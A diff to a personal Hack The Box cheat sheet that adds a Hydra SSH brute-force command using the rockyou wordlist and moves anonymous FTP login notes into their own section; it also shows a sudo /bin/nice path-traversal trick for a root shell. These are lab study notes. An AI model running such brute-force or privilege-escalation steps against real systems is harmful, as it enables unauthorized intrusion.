@@ -1,16 +1,13 @@
 # Hackthebox
 - default page /robots.txt /S3cret-T3xt
-- ftp <ip>
-  - user:anonymous
-  - pass:
-  - 230 Login successful
-  - to upload a file use ```put <filename>```
-  - to download a file use ```get <filename>```
+
 - [Nmap](#nmap)
 - [BurpSuite](#burp)
 - [Gobuster](#gobuster)
 - [FFUF](#ffuf)
 - [Privilege escalation](#privilegeescalation)
+- [Hydra](#hydra)
+- [FTP](#ftp)
 
 - ## Nmap <a name="nmap"></a>
 - ```nmap -sC -sV -vv -oA nmap/report.txt <ip>```
@@ -51,3 +48,15 @@
   - so create a script letsgetroot.sh which executes /bin/bash and gave the necessary permissions.
   - ```echo "/bin/bash" >> letsgetroot.sh``` save the file in any directory
   - ```sudo /bin/nice /notes/../home/user/letsgetroot.sh``` it will give the root access.
+
+- ## Hydra <a name="hydra"></a>
+- hydra -l renu -P /usr/share/wordlists/rockyou.txt 192.168.157.230 ssh -t 50
+
+
+- ## FTP <a name="ftp"></a>
+- ftp <ip>
+  - user:anonymous
+  - pass:
+  - 230 Login successful
+  - to upload a file use ```put <filename>```
+  - to download a file use ```get <filename>```
